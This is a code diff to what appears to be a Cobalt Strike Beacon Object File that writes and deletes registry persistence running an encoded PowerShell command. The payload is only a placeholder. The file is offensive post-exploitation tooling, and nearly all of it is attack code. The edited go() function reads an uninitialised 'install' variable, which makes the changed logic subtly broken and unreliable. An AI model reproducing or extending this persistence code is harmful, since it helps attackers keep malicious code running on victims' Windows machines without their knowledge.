@@ -11,7 +11,6 @@ DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
 DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegDeleteKeyValueW (HKEY, LPCWSTR, LPCWSTR);
 
 void InstallPersistence() {
-    BeaconPrintf(CALLBACK_OUTPUT, "here");
 	HKEY key;
     WCHAR payload[] = L"powershell -enc AAAAAAAA=="; 
 
@@ -64,17 +63,16 @@ void RemovePersistence() {
     {
         BeaconPrintf(CALLBACK_OUTPUT,"Unsuccessful in opening key  \n");
         BeaconPrintf(CALLBACK_OUTPUT,"Cannot find key value in registry \n");
-  
     }
-
 }
 
 void go(char * args, int alen) {
-    int result;
-    result = MSVCRT$strcmp(args, "Remove") == 0;
-    if(result > 0) {
+    int remove;
+    int install;
+    remove = MSVCRT$strcmp(args, "Remove") == 0;
+    if(remove > 0) {
         RemovePersistence();
-    }else {
+    }else if(install > 0){
         InstallPersistence();
     }
     
